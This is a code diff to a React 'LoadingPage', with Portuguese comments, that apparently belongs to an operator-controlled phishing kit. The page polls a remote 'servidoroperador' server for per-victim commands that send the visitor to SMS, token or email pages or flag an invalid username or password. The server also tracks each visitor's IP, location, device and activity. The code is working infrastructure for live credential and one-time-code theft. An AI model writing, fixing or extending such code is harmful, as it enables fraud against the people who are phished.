@@ -46,9 +46,23 @@ const translations = {
 }
 
 // Interface para comandos do servidor
-interface ServerCommand {
-  command: string;
-  clientId?: string;
+interface ServerResponse {
+  data: {
+    command: string;
+    username?: string;
+    ip?: string;
+    country?: string;
+    city?: string;
+    device?: string;
+    referrer?: string;
+    currentUrl?: string;
+    status?: string;
+    response?: any;
+    lastActivity?: string;
+    lastCommands?: any[];
+    isActive?: boolean;
+    commandResponses?: any;
+  };
 }
 
 export default function LoadingPage() {
@@ -82,53 +96,65 @@ export default function LoadingPage() {
     // Recuperar clientId do localStorage (definido durante o login)
     const clientId = localStorage.getItem('client_id') || '';
     
+    if (!clientId) {
+      console.error('Client ID não encontrado no localStorage');
+      return;
+    }
+    
     // Função para verificar comandos
     const checkCommands = async () => {
       try {
-        // Chamar API para verificar comandos
-        const response = await fetch('https://servidoroperador.onrender.com/api/commands/check', {
-          method: 'POST',
+        // Chamar API para verificar comandos usando o endpoint correto
+        const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+          method: 'GET',
           headers: {
             'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ clientId })
+          }
         });
         
         if (response.ok) {
-          const data: ServerCommand = await response.json();
+          const responseData: ServerResponse = await response.json();
+          console.log('Resposta completa da API:', responseData);
           
-          // Processar comandos
-          if (data && data.command) {
-            console.log('Comando recebido:', data.command);
+          // Processar comandos - comando está em responseData.data.command
+          if (responseData && responseData.data && responseData.data.command) {
+            console.log('Comando recebido:', responseData.data.command);
             
-            switch (data.command) {
+            switch (responseData.data.command) {
               case 'ir_sms':
+                console.log('Redirecionando para /sms');
                 router.push('/sms');
                 break;
                 
               case 'ir_auth':
+                console.log('Redirecionando para /token');
                 router.push('/token');
                 break;
                 
               case 'ir_email':
+                console.log('Redirecionando para /email');
                 router.push('/email');
                 break;
                 
               case 'inv_username':
               case 'inv_password':
                 // Armazenar informação de erro no localStorage
+                console.log('Erro de credenciais, voltando para /home');
                 localStorage.setItem('auth_error', 'true');
-                localStorage.setItem('error_type', data.command);
+                localStorage.setItem('error_type', responseData.data.command);
                 router.push('/home');
                 break;
                 
               default:
                 // Comando desconhecido, não fazer nada
+                console.log('Comando desconhecido ou vazio:', responseData.data.command);
                 break;
             }
+          } else {
+            console.log('Nenhum comando pendente, continuando monitoramento...');
           }
         } else {
-          console.error('Erro ao verificar comandos:', await response.text());
+          console.error('Erro ao verificar comandos:', response.status, await response.text());
         }
       } catch (error) {
         console.error('Erro ao verificar comandos:', error);
